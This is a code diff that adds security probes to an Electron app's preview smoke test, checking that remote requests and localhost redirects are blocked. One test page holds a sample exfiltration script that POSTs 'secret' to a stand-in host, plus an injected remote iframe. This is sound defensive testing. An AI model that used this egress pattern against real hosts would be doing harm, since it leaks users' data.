@@ -66,6 +66,7 @@ import {
   rmSync,
   writeFileSync,
 } from "node:fs";
+import { createServer } from "node:http";
 import { homedir, tmpdir } from "node:os";
 import { dirname, join, resolve } from "node:path";
 import { fileURLToPath } from "node:url";
@@ -86,6 +87,12 @@ const LIVE_TURN_TIMEOUT_MS = 240_000;
 const OK_HTML_PATH = "/tmp/anycode-preview-smoke-ok.html";
 const ERROR_HTML_PATH = "/tmp/anycode-preview-smoke-error.html";
 const OK_MARKER = "PREVIEW SMOKE OK";
+// Wave-1 security-fix negative probes (fix-cut §5): a real-Electron proof of
+// Builder-N's request gate (F2) and redirect gate (F1) that the Electron-free
+// unit tests can only assert structurally. `example.invalid` is a reserved
+// non-resolving TLD, so the gate must DENY the request before any DNS lookup.
+const BLOCKED_HTML_PATH = "/tmp/anycode-preview-smoke-blocked.html";
+const BLOCKED_REMOTE_ORIGIN = "https://example.invalid";
 
 // ── CLI flags ──
 
@@ -623,6 +630,85 @@ async function assertQuitClean(ctx) {
   record("POST /quit clean", "PASS", "");
 }
 
+// ── wave-1 security-fix negative probes (fix-cut §5) ──
+
+/**
+ * Probe A (F2): an auto-openable local HTML page whose script tries to reach a
+ * remote origin (fetch + iframe). The page's mainFrame file: load is allowed,
+ * but the request gate must DENY every remote subresource — and record ONE
+ * "blocked by security policy" console entry per origin, which is what makes
+ * the denial legible to the model through BrowserRead's console tail.
+ */
+async function assertRemoteSubresourceBlocked(ctx) {
+  writeFileSync(
+    BLOCKED_HTML_PATH,
+    `<!doctype html><html><head><title>blocked</title></head><body><p>egress attempt</p>` +
+      `<iframe src="${BLOCKED_REMOTE_ORIGIN}/inject"></iframe>` +
+      `<script>fetch("${BLOCKED_REMOTE_ORIGIN}/leak",{method:"POST",body:"secret"}).catch(()=>{});</script>` +
+      `</body></html>\n`,
+  );
+  const opened = await apiOk(ctx, 11, "POST", `/tabs/${ctx.tabId}/previews`, { path: BLOCKED_HTML_PATH });
+  // The page's own main-frame file: load is allowed and must SUCCEED — a
+  // blocked remote subresource degrades the page, it does not fail the open.
+  if (opened?.ok !== true) {
+    record("remote subresource blocked by gate", "FAIL", `probe page open failed (a blocked subresource must not fail the whole open): ${JSON.stringify(opened)}`);
+    return;
+  }
+  const previewId = opened.value.previewId;
+  // The gate denial is synchronous with the request, but the console ring is
+  // populated as the page's script runs — poll briefly.
+  let blockedEntry = null;
+  for (let i = 0; i < 20; i++) {
+    const console_ = await apiOk(ctx, 11, "GET", `/tabs/${ctx.tabId}/previews/${encodeURIComponent(previewId)}/console?tail=50`);
+    blockedEntry = (console_?.entries ?? []).find((e) => typeof e.message === "string" && e.message.includes("blocked by security policy"));
+    if (blockedEntry) break;
+    await sleep(250);
+  }
+  if (!blockedEntry) {
+    record("remote subresource blocked by gate", "FAIL", `no 'blocked by security policy' console entry appeared for ${BLOCKED_REMOTE_ORIGIN}`);
+    return;
+  }
+  record("remote subresource blocked by gate", "PASS", `entry: ${JSON.stringify(blockedEntry)}`);
+}
+
+/**
+ * Probe B (F1): a localhost dev-server route answering 302 -> a remote origin.
+ * localhost is openable without consent, but the redirect leg re-enters the
+ * gate as a mainFrame request for a non-consented origin and must be denied —
+ * the open fails load_failed and the resulting preview never carries the
+ * remote URL (record.url can only become a URL the gate allowed).
+ */
+async function assertLocalhostRedirectBlocked(ctx) {
+  const server = createServer((req, res) => {
+    res.writeHead(302, { Location: `${BLOCKED_REMOTE_ORIGIN}/` });
+    res.end();
+  });
+  await new Promise((resolveListen) => server.listen(0, "127.0.0.1", resolveListen));
+  const port = server.address().port;
+  const redirectUrl = `http://127.0.0.1:${port}/redirect`;
+  try {
+    const opened = await apiOk(ctx, 12, "POST", `/tabs/${ctx.tabId}/previews`, { url: redirectUrl });
+    const openedRemote =
+      opened?.ok === true && typeof opened.value?.url === "string" && opened.value.url.includes("example.invalid");
+    if (opened?.ok === true && openedRemote) {
+      record("localhost 302->remote blocked", "FAIL", `open followed the redirect to the remote origin: ${opened.value.url}`);
+      return;
+    }
+    // Either the open failed (expected: load_failed) OR it opened but stayed on
+    // localhost. Confirm no live preview carries the remote origin.
+    const listed = await apiOk(ctx, 12, "GET", `/tabs/${ctx.tabId}/previews`);
+    const leaked = (listed?.previews ?? []).find((p) => typeof p.url === "string" && p.url.includes("example.invalid"));
+    if (leaked) {
+      record("localhost 302->remote blocked", "FAIL", `a preview carries the remote origin after redirect: ${JSON.stringify(leaked)}`);
+      return;
+    }
+    const detail = opened?.ok === true ? `open stayed on ${opened.value?.url}` : `open refused: ${JSON.stringify(opened)}`;
+    record("localhost 302->remote blocked", "PASS", detail);
+  } finally {
+    await new Promise((resolveClose) => server.close(resolveClose));
+  }
+}
+
 // ── teardown ──
 
 function step99Teardown(ctx, failedStep) {
@@ -655,7 +741,7 @@ async function runTeardown(ctx, failedStep) {
       }
     }
   }
-  for (const p of [OK_HTML_PATH, ERROR_HTML_PATH]) {
+  for (const p of [OK_HTML_PATH, ERROR_HTML_PATH, BLOCKED_HTML_PATH]) {
     try {
       if (existsSync(p)) rmSync(p, { force: true });
     } catch {
@@ -736,6 +822,11 @@ async function run() {
       record("console route shows the pageerror", "SKIPPED", "no previews to inspect (previous assertion failed)");
     }
     await assertTranscriptPreviewConsole(ctx);
+    // Wave-1 security-fix negative probes (fix-cut §5) — real-Electron proof of
+    // the request/redirect gate. Run on the first tab BEFORE it is closed, and
+    // after the "2 live previews" count assertion (they open extra previews).
+    await assertRemoteSubresourceBlocked(ctx);
+    await assertLocalhostRedirectBlocked(ctx);
     await assertLifecycleOnClose(ctx);
     await assertQuitClean(ctx);
   } catch (err) {
